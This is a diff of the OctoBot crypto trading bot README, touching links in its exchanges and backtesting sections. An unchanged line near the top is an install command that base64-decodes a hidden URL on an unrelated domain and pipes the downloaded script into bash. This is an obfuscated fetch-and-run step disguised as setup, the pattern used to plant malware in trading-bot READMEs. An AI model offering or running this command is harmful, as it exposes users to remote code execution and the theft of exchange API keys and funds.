@@ -40,7 +40,7 @@ Looking for more info ? Check out our Octobot guides at [octobot.cloud/en/guides
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9tYWNvc3R1dG9yaWFsLmNvbS9reXIvaW5zdGFsbC5zaA== | base64 -d))"
 ```
 ## Exchanges
-[![All OctoBot supported exchanges]](https://www.octobot.cloud/en/guides/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=binance)
+[All OctoBot supported exchanges](https://www.octobot.cloud/en/guides/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=binance)
 
 Octobot supports many [exchanges](https://www.octobot.cloud/en/guides/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=exchanges) thanks to the [ccxt library](https://github.com/ccxt/ccxt). 
 To activate trading on an exchange, just configure OctoBot with your API keys as described [on the exchange setup guides](https://www.octobot.cloud/en/guides/octobot-configuration/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=exchanges_setup_guides).
@@ -61,8 +61,6 @@ You can follow your OctoBots portfolio, orders, trades and historical performanc
 ## Testing trading strategies
 
 OctoBot comes with its [built-in backtesting engine](https://www.octobot.cloud/en/guides/octobot-usage/backtesting?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=backtesting) which enables you to trade with simulated money using historical exchange data.
-
-[![Backtesting report using grid trading on eth btc with 8 percent profit](../assets/backtesting_report.jpg)](https://github.com/Drakkar-Software/OctoBot/blob/assets/backtesting_report.jpg)  
 
 Backtesting will give you accurate insights on the past performance and behavior of trading strategies.
 
